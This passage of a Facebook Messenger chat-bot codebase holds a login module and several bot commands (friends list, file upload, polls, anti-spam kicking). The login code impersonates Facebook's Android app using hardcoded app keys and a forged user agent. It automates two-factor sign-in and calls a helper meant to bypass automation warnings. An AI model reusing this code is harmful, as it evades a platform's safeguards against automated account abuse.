'login',\n                machine_id,\n                fb_api_caller_class: 'com.facebook.account.login.protocol.Fb4aAuthHandler',\n                api_key: '882a8490361da98702bf97a021ddc14d',\n                access_token: '350685531728|62f8ce9f74b12f84c123cc23437a4a32'\n            };\n\n            const sig = Object.entries(Object.fromEntries(Object.entries(loginData).sort())).map(([k, v]) => `${k}=${v}`).join('');\n            loginData.sig = crypto.createHash('md5').update(sig + loginData.access_token).digest('hex');\n\n            const headers = {\n                'Content-Type': 'application/x-www-form-urlencoded',\n                'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',\n                'x-fb-http-engine': 'Liger',\n                'x-fb-friendly-name': 'authenticate'\n            };\n\n            try {\n                logger.Normal(\"ƒêang g·ª≠i y√™u c·∫ßu ƒëƒÉng nh·∫≠p l·∫ßn ƒë·∫ßu...\");\n                const res = await axios.post('https://b-graph.facebook.com/auth/login', qs.stringify(loginData), { headers });\n\n                const cookies = res.data.session_cookies;\n                const appState = cookies.map(c => ({\n                    key: c.name,\n                    value: c.value,\n                    domain: 'facebook.com',\n                    path: c.path,\n                    expires: c.expires,\n                    httpOnly: c.secure,\n                    secure: c.secure\n                }));\n\n                await this._bypassAutomationWarning(appState);\n\n                fs.writeFileSync(path.join(__dirname, '../../../appstate.json'), JSON.stringify(appState, null, 2));\n                logger.Normal(\"ƒêƒÉng nh·∫≠p th√†nh c√¥ng, appState ƒë√£ ƒë∆∞·ª£c l∆∞u v√†o appstate.json\");\n\n                return { status: true, appState };\n\n            } catch (err) {\n                const errorData = err.response?.data?.error?.error_data;\n\n                if (!errorData || twoFactorSecret === '0') {\n                    logger.Error(\"Thi·∫øu m√£ 2FA ho·∫∑c t√†i kho·∫£n sai.\");\n                    return { status: false, message: 'C·∫ßn m√£ 2FA ho·∫∑c th√¥ng tin ƒëƒÉng nh·∫≠p sai.' };\n                }\n\n                const totpCode = speakeasy.totp({\n                    secret: twoFactorSecret.replace(/\\s+/g, '').toUpperCase(),\n                    encoding: 'base32'\n                });\n\n                logger.Normal(`ƒê√£ t·∫°o m√£ 2FA: ${totpCode}`);\n                logger.Normal(\"G·ª≠i l·∫°i y√™u c·∫ßu ƒëƒÉng nh·∫≠p k√®m m√£ 2FA...\");\n\n                const twoFactorData = {\n                    ...loginData,\n                    credentials_type: 'two_factor',\n                    twofactor_code: totpCode,\n                    userid: errorData.uid,\n                    machine_id: errorData.machine_id,\n                    first_factor: errorData.login_first_factor\n                };\n\n                const sig2 = Object.entries(Object.fromEntries(Object.entries(twoFactorData).sort())).map(([k, v]) => `${k}=${v}`).join('');\n                twoFactorData.sig = crypto.createHash('md5').update(sig2 + loginData.access_token).digest('hex');\n\n                try {\n                    const twoFARes = await axios.post('https://b-graph.facebook.com/auth/login', qs.stringify(twoFactorData), { headers });\n                    const cookies = twoFARes.data.session_cookies;\n                    const appState = cookies.map(c => ({\n                        key: c.name,\n                        value: c.value,\n                        domain: 'facebook.com',\n                        path: c.path,\n                        expires: c.expires,\n                        httpOnly: c.secure,\n                        secure: c.secure\n                    }));\n\n                    await this._bypassAutomationWarning(appState);\n\n                    fs.writeFileSync(path.join(__dirname, '../../../appstate.json'), JSON.stringify(appState, null, 2));\n                    logger.Normal(\"ƒêƒÉng nh·∫≠p b·∫±ng 2FA th√†nh c√¥ng, appState ƒë√£ ƒë∆∞·ª£c l∆∞u.\");\n\n                    return { status: true, appState };\n\n                } catch (err2) {\n                    logger.Error(\"ƒêƒÉng nh·∫≠p v·ªõi 2FA th·∫•t b·∫°i.\");\n                    return { status: false, message: 'ƒêƒÉng nh·∫≠p v·ªõi 2FA th·∫•t b·∫°i.' };\n                }\n            }\n        }\n    }\n\n    return FacebookLogin;\n};","path":null,"size_bytes":9100,"size_tokens":null},"lib/fca-auto/src/getFriendsList.js":{"content":"\"use strict\";\n\n//var cheerio = require(\"cheerio\");\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\n// [almost] copy pasted from one of FB's minified file (GenderConst)\nvar GENDERS = {\n  0: \"unknown\",\n  1: \"female_singular\",\n  2: \"male_singular\",\n  3: \"female_singular_guess\",\n  4: \"male_singular_guess\",\n  5: \"mixed\",\n  6: \"neuter_singular\",\n  7: \"unknown_singular\",\n  8: \"female_plural\",\n  9: \"male_plural\",\n  10: \"neuter_plural\",\n  11: \"unknown_plural\"\n};\n\nfunction formatData(obj) {\n  return Object.keys(obj).map(function (key) {\n    var user = obj[key];\n    return {\n      alternateName: user.alternateName,\n      firstName: user.firstName,\n      gender: GENDERS[user.gender],\n      userID: utils.formatID(user.id.toString()),\n      isFriend: user.is_friend != null && user.is_friend ? true : false,\n      fullName: user.name,\n      profilePicture: user.thumbSrc,\n      type: user.type,\n      profileUrl: user.uri,\n      vanity: user.vanity,\n      isBirthday: !!user.is_birthday\n    };\n  });\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getFriendsList(callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, friendList) {\n        if (err) return rejectFunc(err);\n        resolveFunc(friendList);\n      };\n    }\n\n    defaultFuncs\n      .postFormData(\"https://www.facebook.com/chat/user_info_all\", ctx.jar, {}, { viewer: ctx.userID })\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (!resData) throw { error: \"getFriendsList returned empty object.\" };\n        if (resData.error) throw resData;\n        callback(null, formatData(resData.payload));\n      })\n      .catch(function (err) {\n        log.error(\"getFriendsList\", \"L·ªói getFriendsList C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu ! H√£y H·∫°n Ch·∫ø !\");\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2095,"size_tokens":null},"modules/commands/api.js":{"content":"const fs = require('fs');\nconst path = require('path');\nconst axios = require('axios');\nconst pathApi = path.join(__dirname, '../../img/');\nlet fileName = 'test.json';\n\nmodule.exports.config = {\n\tname: \"api\",\n\tversion: \"1.0.0\",\n\thasPermssion: 2,\n\tcredits: \"Vtuan\",\n\tdescription: \"upload api\",\n\tcommandCategory: \"H·ªá Th·ªëng\",\n  usePrefix: false,\n\tusages: \"\",\n\tcooldowns: 1\n};\nconst countLinesSync = (filePath) => fs.readFileSync(filePath, 'utf-8').split(/\\r\\n|\\r|\\n/).length;\nmodule.exports.run = async function ({ api, event, args }) {\n\ttry {\n    if (event.senderID!= 100040472494187) return api.sendMessage(`???`, event.threadID, event.messageID);\n\t\tif (args.length > 0) {\n\t\t\tconst subCommand = args[0].toLowerCase();\n\t\t\tif (subCommand === 'list') {\n\t\t\t\tconst files = fs.readdirSync(pathApi);\n\t\t\t\tconst jsonFiles = files.filter(file => path.extname(file).toLowerCase() === '.json');\n\t\t\t\tif (jsonFiles.length > 0) {\n\t\t\t\t\tconst fileListArray = jsonFiles.map((file, index) => ({\n\t\t\t\t\t\tindex: index + 1,\n\t\t\t\t\t\tfileName: path.basename(file, '.json'),\n\t\t\t\t\t\tfilePath: path.join(pathApi, file),\n\t\t\t\t\t\tlineCount: countLinesSync(path.join(pathApi, file)),\n\t\t\t\t\t}));\n\t\t\t\t\tconst fileList = fileListArray.map(item => `${item.index}. ${item.fileName} (${item.lineCount} lines)`).join('\\n');\n\t\t\t\t\tconst messageInfo = await api.sendMessage(`Danh s√°ch:\\n${fileList}\\n\\nReply tin nh·∫Øn n√†y: rm/cr/gf + stt`, event.threadID);\n\t\t\t\t\tconst replyInfo = {\n\t\t\t\t\t\tname: module.exports.config.name,\n\t\t\t\t\t\tmessageID: messageInfo.messageID,\n\t\t\t\t\t\tauthor: event.senderID,\n\t\t\t\t\t\tfileListArray,\n\t\t\t\t\t\ttype: 'list'\n\t\t\t\t\t};\n\t\t\t\t\tglobal.client.handleReply.push(replyInfo);\n\t\t\t\t\treturn;\n\t\t\t\t} else {\n\t\t\t\t\treturn api.sendMessage(`Th∆∞ m·ª•c r·ªóng`, event.threadID);\n\t\t\t\t}\n\t\t\t} else if (subCommand === 'add') {\n\t\t\t\tlet msg = '';\n\t\t\t\tconst replyMessage = event.messageReply;\n\t\t\t // let fileName = 'test.json';\n\t\t\t\tif (args.length > 1) {\n\t\t\t\t\tfileName = args.slice(1).join('_') + '.json';\n\t\t\t\t}\n\t\t\t\tconst filePath = path.join(pathApi, fileName);\n\t\t\t\tif (!fs.existsSync(filePath)) {\n\t\t\t\t\tfs.writeFileSync(filePath, '[]', 'utf-8');\n\t\t\t\t}\n\t\t\t\tfor (let i of replyMessage.attachments) {\n\t\t\t\t\tawait axios.get(`https://catbox-mnib.onrender.com/upload?url=${encodeURIComponent(i.url)}`)\n\t\t\t\t\t\t.then(async ($) => {\n\t\t\t\t\t\t\tmsg += `${$.data.url}\\n`;\n\t\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t\tlet existingData = [];\n\t\t\t\ttry {\n\t\t\t\t\tconst fileContent = fs.readFileSync(filePath, 'utf-8');\n\t\t\t\t\texistingData = JSON.parse(fileContent);\n\t\t\t\t} catch (error) {\n\t\t\t\t\tconsole.error('L·ªói ƒë·ªçc file JSON:', error);\n\t\t\t\t}\n\t\t\t\texistingData = existingData.concat(msg.split('\\n').filter(Boolean));\n\t\t\t\tfs.writeFileSync(filePath, JSON.stringify(existingData, null, 2), 'utf-8');\n\t\t\t\treturn api.sendMessage(msg, event.threadID);\n\t\t\t} else if (subCommand === 'cr') {\n\t\t\t // let fileName = 'test.json';\n\t\t\t\tif (args.length > 1) {\n\t\t\t\t\tfileName = args.slice(1).join('_') + '.json';\n\t\t\t\t}\n\t\t\t\tconst filePath = path.join(pathApi, fileName);\n\t\t\t\tif (!fs.existsSync(filePath)) {\n\t\t\t\t\tfs.writeFileSync(filePath, '[]', 'utf-8');\n\t\t\t\t\treturn api.sendMessage(`ƒê√£ t·∫°o file ${fileName}`, event.threadID);\n\t\t\t\t} else {\n\t\t\t\t\treturn api.sendMessage(`File ${fileName} ƒë√£ t·ªìn t·∫°i`, event.threadID);\n\t\t\t\t}\n\t\t\t} else if (subCommand === 'rm') {\n\t\t\t\t//let fileName = 'test.json';\n\t\t\t\tif (args.length > 1) {\n\t\t\t\t\tfileName = args.slice(1).join('_') + '.json';\n\t\t\t\t}\n\t\t\t\tconst filePath = path.join(pathApi, fileName);\n\t\t\t\tif (fs.existsSync(filePath)) {\n\t\t\t\t\tfs.unlinkSync(filePath);\n\t\t\t\t\treturn api.sendMessage(`ƒê√£ x√≥a file ${fileName}`, event.threadID);\n\t\t\t\t} else {\n\t\t\t\t\treturn api.sendMessage(`File ${fileName} kh√¥ng t·ªìn t·∫°i`, event.threadID);\n\t\t\t\t}\n\t\t\t} else if (subCommand === 'gf' && args.length > 1) {\n\t\t\t\tconst fileName = args[1].toLowerCase() + '.json';\n\t\t\t\tconst filePath = path.join(__dirname, '../../img/', fileName);\n\t\t\t\tif (fs.existsSync(filePath)) {\n\t\t\t\t\ttry {\n\t\t\t\t\t\tconst fileContent = fs.readFileSync(filePath, 'utf-8');\n\t\t\t\t\t\tconst response = await axios.post(\"https://api.mocky.io/api/mock\", {\n\t\t\t\t\t\t\tstatus: 200,\n\t\t\t\t\t\t\tcontent: fileContent,\n\t\t\t\t\t\t\tcontent_type: \"application/json\",\n\t\t\t\t\t\t\tcharset: \"UTF-8\",\n\t\t\t\t\t\t\tsecret: \"NguyenMinhHuy\",\n\t\t\t\t\t\t\texpiration: \"never\"\n\t\t\t\t\t\t});\n\t\t\t\t\t\treturn api.sendMessage(`${fileName}: ${response.data.link}`, event.threadID);\n\t\t\t\t\t} catch (error) {\n\t\t\t\t\t\tconsole.error(`Error processing file ${fileName}:`, error);\n\t\t\t\t\t\treturn api.sendMessage(`ƒê√£ x·∫£y ra l·ªói trong qu√° tr√¨nh x·ª≠ l√Ω file ${fileName}`, event.threadID);\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tconsole.error(`File ${fileName} kh√¥ng t·ªìn t·∫°i`);\n\t\t\t\t\treturn api.sendMessage(`File ${fileName} kh√¥ng t·ªìn t·∫°i`, event.threadID);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tconst files = fs.readdirSync(pathApi);\n\t\tconst jsonFiles = files.filter(file => path.extname(file).toLowerCase() === '.json');\n\t\tconst tong = jsonFiles.length;\n\t\tlet tsdong = 0;\n\t\tfor (const file of jsonFiles) {\n\t\t\tconst filePath = path.join(pathApi, file);\n\t\t\ttsdong += countLinesSync(filePath);\n\t\t}\n\t\tconst cachsudung = `\\n‚©∫ list: xem to√†n b·ªô danh s√°ch api\\n‚©∫ rm + t√™n file json mu·ªën x√≥a\\n‚©∫ cr + t√™n file json ƒë·ªÉ t·∫°o file m·ªõi\\n‚©∫ gf + t√™n file ƒë·ªÉ share file api\\n‚©∫ add:  reply mp3,mp4,jpg mu·ªën l√†m api!\\n‚Ä£ add + t√™n file c·ª• th·ªÉ\\n‚Ä£ add + ƒë·ªÉ tr·ªëng `;\nreturn api.sendMessage(`C√°ch s·ª≠ d·ª•ng\\n${cachsudung}\\n‚™º T·ªïng s·ªë file api hi·ªán c√≥: ${tong}\\n‚™º T·ªïng s·ªë d√≤ng: ${tsdong}\\n\\n‚™ß Reply tin nh·∫Øn n√†y: cr + t√™n file ƒë·ªÉ t·∫°o file json m·ªõi`, event.threadID, async (error, info) => {\n\t\t\tif (error) {\n\t\t\t\tconsole.error(error);\n\t\t\t} else {\n\t\t\t\tglobal.client.handleReply.push({\n\t\t\t\t\tname: module.exports.config.name,\n\t\t\t\t\tmessageID: info.messageID,\n\t\t\t\t\tauthor: event.senderID,\n\t\t\t\t\ttype: 'api'\n\t\t\t\t});\n\t\t\t}\n\t\t});\n\t} catch (error) {\n\t\tconsole.error('Error in run function:', error);\n\t\treturn api.sendMessage('ƒê√£ x·∫£y ra l·ªói trong qu√° tr√¨nh x·ª≠ l√Ω!', event.threadID);\n\t}\n};\nmodule.exports.handleReply = async ({ api, handleReply, event }) => {\n\ttry {\n\t\tconst { threadID, senderID, body, messageID } = event;\n\t\tconst { fileListArray, type } = handleReply;\n\t\tconst args = body.split(' ');\n\t\tconst getPath = (fileName) => path.join(__dirname, '../../img/', `${fileName}.json`);\n\t\tconst getFilePath = (fileName) => path.join(__dirname, '../../img/', `${fileName}.json`);\n\t\tconst Vtuandz = (message) => api.sendMessage(message, threadID);\n\t\tif (type === 'list') {\n\t\t\tif (args[0].toLowerCase() === 'rm') {\n\t\t\t\tconst fileIndices = args.slice(1).map(index => parseInt(index));\n\t\t\t\tfor (const fileIndex of fileIndices) {\n\t\t\t\t\tif (fileIndex >= 1 && fileIndex <= fileListArray.length) {\n\t\t\t\t\t\tconst selectedFile = fileListArray[fileIndex - 1];\n\t\t\t\t\t\tconst filePath = getPath(selectedFile.fileName);\n\t\t\t\t\t\tfs.unlink(filePath, (err) => {\n\t\t\t\t\t\t\tif (err) console.error(`Error deleting file ${filePath}:`, err);\n\t\t\t\t\t\t});\n\t\t\t\t\t\t\tVtuandz(`ƒê√£ x√≥a file ${selectedFile.fileName}`);\n\t\t\t\t\t} else {\n\t\t\t\t\t\t\tVtuandz(`Index ${fileIndex} kh√¥ng h·ª£p l·ªá`);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} else if (args[0].toLowerCase() === 'cr') {\n\t\t\t\t//let fileName = 'test.json';\n\t\t\t\tif (args.length > 1) fileName = args.slice(1).join('_') + '.json';\n\t\t\t\tconst filePath = getPath(fileName);\n\t\t\t\tif (!fs.existsSync(filePath)) {\n\t\t\t\t\tfs.writeFileSync(filePath, '[]', 'utf-8');\n\t\t\t\t\t\tVtuandz(`ƒê√£ t·∫°o file ${fileName}`);\n\t\t\t\t} else {\n\t\t\t\t\t\tVtuandz(`File ${fileName} ƒë√£ t·ªìn t·∫°i`);\n\t\t\t\t}\n\t\t\t} else if (args[0].toLowerCase() === 'gf') {\n\t\t\t\tconst fileIndices = args.slice(1).map(index => parseInt(index));\n\t\t\t\tfor (const fileIndex of fileIndices) {\n\t\t\t\t\tif (fileIndex >= 1 && fileIndex <= fileListArray.length) {\n\t\t\t\t\t\tconst selectedFile = fileListArray[fileIndex - 1];\n\t\t\t\t\t\tconst filePath = getPath(selectedFile.fileName);\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tconst fileContent = fs.readFileSync(filePath, 'utf-8');\n\t\t\t\t\t\t\tconst response = await axios.post(\"https://api.mocky.io/api/mock\", {\n\t\t\t\t\t\t\t\tstatus: 200,\n\t\t\t\t\t\t\t\tcontent: fileContent,\n\t\t\t\t\t\t\t\tcontent_type: \"application/json\",\n\t\t\t\t\t\t\t\tcharset: \"UTF-8\",\n\t\t\t\t\t\t\t\tsecret: \"NguyenMinhHuy\",\n\t\t\t\t\t\t\t\texpiration: \"never\"\n\t\t\t\t\t\t\t});\n\t\t\t\t\t\t\tconst mockyLink = response.data.link;\n\t\t\t\t\t\t\tconsole.log(mockyLink);\n\t\t\t\t\t\t\t\tVtuandz(`${selectedFile.fileName}: ${mockyLink}`);\n\t\t\t\t\t\t} catch (error) {\n\t\t\t\t\t\t\tconsole.error('Error posting file content to RunMocky or processing response:', error);\n\t\t\t\t\t\t\t\tVtuandz('ƒê√£ x·∫£y ra l·ªói trong qu√° tr√¨nh x·ª≠ l√Ω!');\n\t\t\t\t\t\t}\n\t\t\t\t\t} else {\n\t\t\t\t\t\t\tVtuandz(`Index ${fileIndex} kh√¥ng h·ª£p l·ªá`);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} else if (type === 'api' && args[0].toLowerCase() === 'cr') {\n\t\t // let fileName = 'test.json';\n\t\t\tif (args.length > 1) fileName = args.slice(1).join('_') + '.json';\n\t\t\tconst filePath = getPath(fileName);\n\t\t\tif (!fs.existsSync(filePath)) {\n\t\t\t\tfs.writeFileSync(filePath, '[]', 'utf-8');\n\t\t\t\t\tVtuandz(`ƒê√£ t·∫°o file ${fileName}`);\n\t\t\t} else {\n\t\t\t\t\tVtuandz(`File ${fileName} ƒë√£ t·ªìn t·∫°i`);\n\t\t\t}\n\t\t}\n\t} catch (error) {\n\t\tconsole.error('L·ªói trong h√†m handleReply:', error);\n\t}\n};","path":null,"size_bytes":8975,"size_tokens":null},"lib/fca-auto/src/createPoll.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function createPoll(title, threadID, options, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      if (utils.getType(options) == \"Function\") {\n        callback = options;\n        options = null;\n      }\n      else {\n        callback = function (err) {\n          if (err) return rejectFunc(err);\n          resolveFunc();\n        };\n      }\n    }\n    if (!options) options = {}; // Initial poll options are optional\n\n    var form = {\n      target_id: threadID,\n      question_text: title\n    };\n\n    // Set fields for options (and whether they are selected initially by the posting user)\n    var ind = 0;\n    for (var opt in options) {\n      // eslint-disable-next-line no-prototype-builtins\n      if (options.hasOwnProperty(opt)) {\n        form[\"option_text_array[\" + ind + \"]\"] = opt;\n        form[\"option_is_selected_array[\" + ind + \"]\"] = options[opt] ? \"1\" : \"0\";\n        ind++;\n      }\n    }\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/group_polling/create_poll/?dpr=1\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.payload.status != \"success\") throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"createPoll\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1679,"size_tokens":null},"modules/commands/antispam.js":{"content":"const fs = require(\"fs-extra\");\n\nmodule.exports.config = {\n    name: \"antispam\",\n    version: \"1.0.1\",\n    hasPermssion: 1,\n    credits: \"TatsuYTB\",\n    description: \"T·ª± ƒë·ªông kick ng∆∞·ªùi d√πng khi spam trong nh√≥m\",\n    commandCategory: \"Qu·∫£n L√≠ Box\",\n    usages: \"antispam\",\n    cooldowns: 0,\n};\n\nconst path = \"./modules/commands/data/antispam.json\";\nlet antiSpamStatus = {};\nlet usersSpam = {};\n\nif (!fs.existsSync(path)) {\n    fs.writeFileSync(path, JSON.stringify({}, null, 4));\n} else {\n    antiSpamStatus = JSON.parse(fs.readFileSync(path));\n}\n\nmodule.exports.handleEvent = async function ({ api, event }) {\n    const { threadID, senderID, messageID, type } = event;\n\n    if (!antiSpamStatus[threadID] || !antiSpamStatus[threadID].status) return;\n\n    const settings = antiSpamStatus[threadID];\n\n    if (type !== \"message\" && type !== \"message_reply\" && type !== \"message_sticker\") return;\n\n    if (!usersSpam[senderID]) {\n        usersSpam[senderID] = { count: 0, start: Date.now() };\n    }\n\n    const userSpamData = usersSpam[senderID];\n    userSpamData.count++;\n\n    if (Date.now() - userSpamData.start > settings.spamTime) {\n        userSpamData.count = 1;\n        userSpamData.start = Date.now();\n    }\n\n    if (userSpamData.count > settings.spamCount) {\n        try {\n            const userInfo = await api.getUserInfo(senderID);\n            const userName = userInfo[senderID]?.name || \"ùêçùê†ùêÆÃõùê®ÃõÃÄùê¢ ùêùùêÆÃÄùêßùê† ùêÖùêöùêúùêûùêõùê®ùê®ùê§\";\n\n            api.removeUserFromGroup(senderID, threadID, (err) => {\n                if (!err) {\n                    api.sendMessage(\n                        {\n                            body: `‚úÖ Th√†nh vi√™n [ ${userName} ] ƒë√£ b·ªã kick do v∆∞·ª£t qu√° ${settings.spamCount} tin nh·∫Øn trong ${settings.spamTime / 1000} gi√¢y.`,\n                            mentions: [{ tag: `[${userName}]`, id: senderID }],\n                        },\n                        threadID\n                    );\n                } else {\n                    api.sendMessage(\n                        \"‚ùå C√≥ l·ªói khi kick th√†nh vi√™n spam. H√£y c·∫•p quy·ªÅn Qu·∫£n Tr·ªã Vi√™n cho bot\",\n                        threadID\n                    );\n                }\n            });\n        } catch (error) {\n            api.sendMessage(\n                \"‚ùå L·ªói khi l·∫•y th√¥ng tin, Kh√¥ng th·ªÉ kick th√†nh vi√™n.\",\n                threadID\n            );\n        }\n\n        delete usersSpam[senderID];\n    }\n};\n\nmodule.exports.run = async function ({ api, event, args }) {\n    const { threadID } = event;\n    const infoThread = await api.getThreadInfo(threadID);\n    const adminIDs = infoThread.adminIDs.map((e) => e.id);\n    const idBot = api.getCurrentUserID();\n\n    if (!adminIDs.includes(idBot)) {\n        return api.sendMessage(\"Bot c·∫ßn quy·ªÅn Qu·∫£n Tr·ªã Vi√™n ƒë·ªÉ s·ª≠ d·ª•ng t√≠nh nƒÉng n√†y.\", threadID);\n    }\n\n    switch (args[0]) {\n        case \"set\":\n            const spamCount = parseInt(args[1]);\n            const spamTimeInSeconds = parseInt(args[2]);\n\n            if (!spamCount || !spamTimeInSeconds) {\n                return api.sendMessage(\n                    \"Vui l√≤ng cung c·∫•p Tin Nh·∫Øn v√† Th·ªùi Gian h·ª£p l·ªá\",\n                    threadID\n                );\n            }\n\n            antiSpamStatus[threadID] = {\n                spamCount,\n                spamTime: spamTimeInSeconds * 1000,\n                status: false,\n            };\n\n            fs.writeFileSync(path, JSON.stringify(antiSpamStatus, null, 4));\n            api.sendMessage(\n                `‚úÖ ƒê√£ c√†i ƒë·∫∑t ch·ªëng spam:\\n- S·ªë tin nh·∫Øn: ${spamCount}\\n- Th·ªùi gian: ${spamTimeInSeconds} gi√¢y\\nD√πng 'antispam on' ƒë·ªÉ b·∫≠t ch·∫ø ƒë·ªô ch·ªëng spam.`,\n                threadID\n            );\n            break;\n\n        case \"on\":\n            if (!antiSpamStatus[threadID]) {\n                return api.sendMessage(\n                    \"‚ùå Vui l√≤ng c√†i ƒë·∫∑t th√¥ng s·ªë d√πng '#antispam set tin nh·∫Øn gi√¢y(v√≠ d·ª•: antispam set 5 10)'.\",\n                    threadID\n                );\n            }\n\n            antiSpamStatus[threadID].status = true;\n            fs.writeFileSync(path, JSON.stringify(antiSpamStatus, null, 4));\n            api.sendMessage(\"üîí ƒê√£ b·∫≠t ch·∫ø ƒë·ªô ch·ªëng spam.\", threadID);\n            break;\n\n        case \"off\":\n            if (antiSpamStatus[threadID]) {\n                antiSpamStatus[threadID].status = false;\n                fs.writeFileSync(path, JSON.stringify(antiSpamStatus, null, 4));\n                api.sendMessage(\"üîì ƒê√£ t·∫Øt ch·∫ø ƒë·ªô ch·ªëng spam.\", threadID);\n            } else {\n                api.sendMessage(\"‚ùå Ch·∫ø ƒë·ªô ch·ªëng spam ch∆∞a ƒë∆∞·ª£c thi·∫øt l·∫≠p!!!\", threadID);\n            }\n            break;\n\n        default:\n            api.sendMessage(\n                \"üìñ H∆∞·ªõng d·∫´n s·ª≠ d·ª•ng:\\n- B·∫≠t: antispam on\\n- T·∫Øt: antispam off\\n- C√†i ƒë·∫∑t: #antispam set tin nh·∫Øn gi√¢y(v√≠ d·ª•: #antispam set 5 10 l√† khi c√≥ ng∆∞·ªùi chat qu√° 5 tin nh·∫Øn trong 10 gi√¢y bot s·∫Ω kick ng∆∞·ªùi ƒë√≥)\",\n                threadID\n            );\n    }\n};\n","path":null,"size_bytes":5152,"size_tokens":null},"modules/commands/chuanip.js":{"content":"const fs = require(\"fs\");\nconst path = require(\"path\");\n\nmodule.exports.config = {\n    name: \"chuanip\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Tra c·ª©u chu·∫©n kh√°ng n∆∞·ªõc v√† b·ª•i IP\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"chuanip IPxx\",\n    cooldowns: 3\n};\n\nconst ipRatings = {\n    \"0\": \"Kh√¥ng b·∫£o v·ªá\",\n    \"1\": \"B·∫£o v·ªá kh·ªèi v·∫≠t th·ªÉ l·ªõn h∆°n 50mm\",\n    \"2\": \"B·∫£o v·ªá kh·ªèi v·∫≠t th·ªÉ l·ªõn h∆°n 12.5mm\",\n    \"3\": \"B·∫£o v·ªá kh·ªèi v·∫≠t th·ªÉ l·ªõn h∆°n 2.5mm\",\n    \"4\": \"B·∫£o v·ªá kh·ªèi v·∫≠t th·ªÉ l·ªõn h∆°n 1mm\",\n    \"5\": \"B·∫£o v·ªá ch·ªëng b·ª•i m·ªôt ph·∫ßn\",\n    \"6\": \"B·∫£o v·ªá ho√†n to√†n kh·ªèi b·ª•i\",\n    \"X\": \"Kh√¥ng x√°c ƒë·ªãnh\"\n};\n\nconst waterRatings = {\n    \"0\": \"Kh√¥ng b·∫£o v·ªá\",\n    \"1\": \"Ch·ªëng nh·ªè gi·ªçt theo chi·ªÅu d·ªçc\",\n    \"2\": \"Ch·ªëng nh·ªè gi·ªçt khi nghi√™ng 15¬∞\",\n    \"3\": \"Ch·ªëng phun n∆∞·ªõc (spray)\",\n    \"4\": \"Ch·ªëng tia n∆∞·ªõc (splash)\",\n    \"5\": \"Ch·ªëng v√≤i n∆∞·ªõc √°p su·∫•t th·∫•p\",\n    \"6\": \"Ch·ªëng v√≤i n∆∞·ªõc √°p su·∫•t m·∫°nh\",\n    \"7\": \"Ch·ªëng ng√¢m n∆∞·ªõc trong t·ªëi ƒëa 30 ph√∫t ·ªü ƒë·ªô s√¢u 1m\",\n    \"8\": \"Ch·ªëng ng√¢m l√¢u d√†i d∆∞·ªõi n∆∞·ªõc (s·∫£n xu·∫•t ƒë·∫∑c bi·ªát)\",\n    \"9\": \"Ch·ªëng tia n∆∞·ªõc √°p su·∫•t cao, nhi·ªát ƒë·ªô cao\"\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n    if (args.length === 0) {\n        return api.sendMessage(\"Vui l√≤ng nh·∫≠p m√£ chu·∫©n IP, v√≠ d·ª•: chuanip IP67\", event.threadID, event.messageID);\n    }\n\n    const input = args[0].toUpperCase();\n    const match = input.match(/^IP(\\d|X)(\\d)$/);\n\n    if (!match) {\n        return api.sendMessage(\"M√£ IP kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng, v√≠ d·ª•: IP68\", event.threadID, event.messageID);\n    }\n\n    const solid = match[1];\n    const liquid = match[2];\n\n    const solidDesc = ipRatings[solid] || \"Kh√¥ng x√°c ƒë·ªãnh\";\n    const liquidDesc = waterRatings[liquid] || \"Kh√¥ng x√°c ƒë·ªãnh\";\n\n    const msg = `üìå Chu·∫©n ${input}\\n\\n` +\n        `üß± B·∫£o v·ªá b·ª•i (ch·ªØ s·ªë ƒë·∫ßu ti√™n - ${solid}): ${solidDesc}\\n` +\n        `üíß B·∫£o v·ªá n∆∞·ªõc (ch·ªØ s·ªë th·ª© hai - ${liquid}): ${liquidDesc}`;\n\n    const imagePath = path.join(__dirname, \"anh\", \"ip.jpg\");\n\n    // Ki·ªÉm tra file ·∫£nh c√≥ t·ªìn t·∫°i kh√¥ng\n    if (fs.existsSync(imagePath)) {\n        return api.sendMessage({\n            body: msg,\n            attachment: fs.createReadStream(imagePath)\n        }, event.threadID, event.messageID);\n    } else {\n        return api.sendMessage(msg + \"\\n‚ö†Ô∏è Kh√¥ng t√¨m th·∫•y ·∫£nh t·∫°i: \" + imagePath, event.threadID, event.messageID);\n    }\n};","path":null,"size_bytes":2660,"size_tokens":null},"modules/commands/uidall.js":{"content":"module.exports.config = {\n    name: \"uidall\",\n    version: \"1.0.5\",\n    hasPermssion: 0,\n    credits: 